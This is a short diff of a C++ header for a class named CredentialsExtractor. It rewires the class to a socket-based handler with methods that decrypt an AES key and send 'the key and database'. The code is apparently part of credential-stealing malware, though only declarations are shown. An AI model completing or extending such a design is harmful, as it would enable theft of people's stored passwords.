@@ -8,14 +8,17 @@
 #include <string>
 #include <iostream>
 #include "json.hpp"
+#include "ZipCompressor.h"
+#include "Handler.h"
+#include "Download.h"
 
-class CredentialsExtractor : public Sender {
+class CredentialsExtractor : public Handler {
 public:
-    explicit CredentialsExtractor(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap);
+    Download &download;
+    explicit CredentialsExtractor(ClientSocket &clientSocket, Download &download);
     std::vector<BYTE> decryptAESKey(const std::string& encryptedDataStr);
     std::vector<BYTE>  getDecryptedKey();
-    void sendKeyAndDatabase();
-    void send() override;
+    void sendKeyAndDatabase(nlohmann::json);
 };
 
 
